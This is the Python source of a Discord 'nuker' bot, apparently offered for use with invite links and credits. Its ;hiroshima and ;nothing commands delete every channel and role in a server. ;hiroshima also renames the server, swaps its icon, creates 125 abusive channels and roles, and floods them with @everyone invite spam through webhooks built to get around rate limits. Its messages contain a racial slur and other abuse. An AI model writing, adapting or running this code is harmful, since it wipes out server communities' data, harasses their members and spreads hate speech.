import discord
from discord.ext import commands
import asyncio
import random
import colorama
import os
import aiohttp
from dotenv import load_dotenv
from colorama import Fore, Back, Style, init
import time
from collections import deque

init()
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix=";", intents=intents)
client.remove_command("help")

# Whitelist for servers where bot is disabled
whitelisted_servers = set()

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

# Discord bot's terminal
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")

REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"

# ============================================================
#  ULTRA SPAM ENGINE — WEBHOOK + RATE LIMIT AWARE
# ============================================================

class RateLimiter:
    def __init__(self, max_requests_per_second=30):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.05
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_requests_per_second=30)

async def webhook_raid(channels, amount_per_channel=200):
    """
    SPAM VIA WEBHOOKS — the fastest single-token method.
    Creates a webhook in each channel and spams through it.
    """
    if not channels:
        return 0
    
    total_sent = 0
    tasks = []
    
    async def spam_channel_with_webhook(ch):
        nonlocal total_sent
        webhook = None
        try:
            # Create webhook
            webhook = await ch.create_webhook(name="Blossom Nuker")
            print(f"[WEBHOOK] Created webhook in #{ch.name}")
            
            # Spam with webhook (30/sec limit per webhook)
            for i in range(amount_per_channel):
                try:
                    await webhook.send(SPAM_MESSAGE)
                    total_sent += 1
                    # Webhooks can handle 30/sec, tiny delay to be safe
                    if i % 25 == 0:
                        await asyncio.sleep(0.03)
                except discord.HTTPException as e:
                    if e.status == 429:
                        # Rate limit hit — wait and retry
                        retry_after = float(e.response.headers.get('Retry-After', 0.5))
                        await asyncio.sleep(retry_after + 0.1)
                        try:
                            await webhook.send(SPAM_MESSAGE)
                            total_sent += 1
                        except:
                            pass
                    else:
                        # Webhook might be dead, recreate it
                        try:
                            await webhook.delete()
                            webhook = await ch.create_webhook(name="Blossom Nuker")
                        except:
                            break
                except Exception:
                    pass
            
            # Clean up
            try:
                await webhook.delete()
            except:
                pass
            
        except discord.Forbidden:
            print(f"[WEBHOOK] Can't create webhook in #{ch.name} — missing perms")
        except Exception as e:
            print(f"[WEBHOOK ERROR] {e}")
    
    # Process channels in batches to avoid overloading
    batch_size = 5
    for i in range(0, len(channels), batch_size):
        batch = channels[i:i+batch_size]
        tasks = [asyncio.create_task(spam_channel_with_webhook(ch)) for ch in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        # Brief pause between batches
        await asyncio.sleep(0.3)
    
    print(f"[WEBHOOK RAID] Sent {total_sent} messages across {len(channels)} channels")
    return total_sent

async def ultra_spam(channel, message, amount):
    """Fallback spam method using normal messages (if webhooks fail)."""
    if not channel.permissions_for(channel.guild.me).send_messages:
        return 0
    
    sent_count = 0
    semaphore = asyncio.Semaphore(8)
    
    async def send_one():
        nonlocal sent_count
        async with semaphore:
            try:
                await rate_limiter.wait_if_needed()
                await channel.send(message)
                sent_count += 1
                return True
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.response.headers.get('Retry-After', 1))
                    await asyncio.sleep(retry_after + 0.1)
                    try:
                        await channel.send(message)
                        sent_count += 1
                        return True
                    except:
                        return False
                return False
            except Exception:
                return False
    
    tasks = [asyncio.create_task(send_one()) for _ in range(min(amount, 500))]
    await asyncio.gather(*tasks, return_exceptions=True)
    return sent_count

async def send_invite_spam(channels, amount=9999):
    """Main spam function — tries webhooks first, falls back to normal messages."""
    if not channels:
        return
    
    print(f"[SPAM] Starting spam on {len(channels)} channels...")
    
    # Try webhook raid first (faster)
    sent = await webhook_raid(channels, amount_per_channel=min(amount // len(channels) if len(channels) > 0 else amount, 300))
    
    # If webhooks failed or sent little, fallback to normal messages
    if sent < 100:
        print("[SPAM] Webhook raid slow, falling back to normal messages...")
        total_sent = 0
        for channel in channels:
            sent_count = await ultra_spam(channel, SPAM_MESSAGE, amount // len(channels) if len(channels) > 0 else amount)
            total_sent += sent_count
        print(f"[SPAM] Fallback sent {total_sent} messages")
    else:
        print(f"[SPAM] Webhook raid sent {sent} messages")

# ============================================================
#  COMMANDS
# ============================================================

@client.command()
async def hiroshima(ctx):
    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
    guild = ctx.guild

    # --- CHANGE SERVER NAME & ICON ---
    try:
        if not ctx.guild.me.guild_permissions.manage_guild:
            await ctx.send("❌ Missing `manage_guild` permission.")
        else:
            await guild.edit(name="fuck you blossom owns")
            print(f"[SUCCESS] Server name changed.")
            
            icon_url = "https://cdn.discordapp.com/attachments/1516425080865820743/1517713469682487416/pfp.png?ex=6a374850&is=6a35f6d0&hm=b4f447f0e4dd2897798483ade19dfa3b7fc18fb190606b202d9e163be489fc8c&"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url, timeout=10) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        if image_data[:4] in (b'\x89PNG', b'\xff\xd8\xff', b'GIF8'):
                            await guild.edit(icon=image_data)
                            print("[SUCCESS] Server icon changed.")
                        else:
                            print("[ERROR] Invalid image data.")
                    else:
                        print(f"[ERROR] Failed to download icon. Status: {resp.status}")
    except discord.Forbidden:
        print("[ERROR] Bot lacks permission to edit guild.")
        await ctx.send("❌ Bot lacks `manage_guild` or `administrator` permission.")
    except Exception as e:
        print(f"[ERROR] {e}")

    # --- REPORT CHANNEL ---
    report_channel = client.get_channel(REPORT_CHANNEL_ID)
    if report_channel is not None:
        embed = discord.Embed(
            title="Hiroshima command used",
            description=f"A server has been targeted with `;hiroshima`.",
            color=discord.Color.red()
        )
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.add_field(name="Server name", value=guild.name, inline=False)
        embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
        embed.add_field(name="Server ID", value=str(guild.id), inline=False)
        embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.set_footer(text="Blossom Nuker report")
        await report_channel.send(embed=embed)
    else:
        print(f"Report channel {REPORT_CHANNEL_ID} not found.")

    # --- DELETE CHANNELS ---
    delete_channels = [asyncio.create_task(channel.delete()) for channel in list(guild.channels)]
    if delete_channels:
        results = await asyncio.gather(*delete_channels, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING CHANNELS: {failed} FAILED")

    # --- DELETE ROLES ---
    delete_roles = [asyncio.create_task(role.delete()) for role in list(guild.roles) if role.name != "@everyone"]
    if delete_roles:
        results = await asyncio.gather(*delete_roles, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING ROLES: {failed} FAILED")

    # --- CREATE 125 ROLES ---
    create_roles = [guild.create_role(name="Fucked By blossom.") for _ in range(125)]
    await asyncio.gather(*create_roles, return_exceptions=True)

    # --- CREATE 125 CHANNELS ---
    create_channels = [guild.create_text_channel(name="Fucked By blossom.") for _ in range(125)]
    channels = await asyncio.gather(*create_channels, return_exceptions=True)
    channels = [c for c in channels if not isinstance(c, Exception)]

    # --- ULTRA SPAM ---
    if channels:
        await send_invite_spam(channels, amount=9999)

@client.command()
async def spaminvite(ctx, amount: int = 25):
    """Spam the invite link across all visible text channels."""
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming `{INVITE_TEXT}` {amount} times per channel...")
    await send_invite_spam(channels, amount=amount)
    await ctx.send("Invite spam finished.")

@client.command()
async def kicka(ctx, member: discord.Member = None):
    """Kick a specific member, or all bots if no member specified."""
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return

    # If a member is specified, kick them (human or bot)
    if member is not None:
        if member == ctx.author:
            await ctx.send("❌ You can't kick yourself.")
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            await ctx.send("❌ You can't kick someone with a higher or equal role.")
            return
        if not ctx.author.guild_permissions.kick_members:
            await ctx.send("❌ You need `Kick Members` permission.")
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author} using ;kicka")
            await ctx.send(f"✅ Kicked {member.mention}")
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to kick that member.")
        except Exception as e:
            await ctx.send(f"❌ Error: {e}")
        return

    # If no member specified, kick ALL bots (original behavior)
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the `Kick Members` permission to use this command.")
        return

    target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
    if not target_bots:
        await ctx.send("No bots found to kick.")
        return

    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author} using ;kicka")
            kicked += 1
        except Exception:
            failed += 1

    if failed:
        await ctx.send(f"✅ Kicked {kicked} bot(s). ❌ {failed} failed.")
    else:
        await ctx.send(f"✅ Kicked all {kicked} bot(s).")

@client.command()
async def blame(ctx, member: discord.Member = None):
    target = member or ctx.author
    reason = random.choice([
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!",
        "thanks for nuking nigga!"
    ])
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed for nuking the server.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text="The evidence is mostly vibes.")
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    messages = [
        ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
        ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
        ctx.send("**[4] ;kicka - Kicks all bots in the server**"),
        ctx.send("**[5] ;blame @user - Accuses someone for nuking the server**"),
        ctx.send("**-------------------------------------------------------------------------**"),
        ctx.send("**[6] ;credits - Shows My Socials  |     [7] ;nothing - nothing left**")
    ]
    await asyncio.gather(*messages)

@client.command()
async def credits(ctx):
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command()
async def getbot(ctx):
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

OWNER_ID = 1446215395358015559

@client.command()
async def whitelist(ctx, action: str, guild_id: int = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Restricted.")
        return
    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been whitelisted. Bot is now disabled there.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` has been removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted servers:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command()
async def nothing(ctx):
    guild = ctx.guild
    delete_channels = [asyncio.create_task(channel.delete()) for channel in list(guild.channels)]
    if delete_channels:
        results = await asyncio.gather(*delete_channels, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING CHANNELS: {failed} FAILED")
    
    delete_roles = [asyncio.create_task(role.delete()) for role in list(guild.roles) if role.name != "@everyone"]
    if delete_roles:
        results = await asyncio.gather(*delete_roles, return_exceptions=True)
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed > 0:
            print(f"  DELETING ROLES: {failed} FAILED")

client.run(TOKEN)
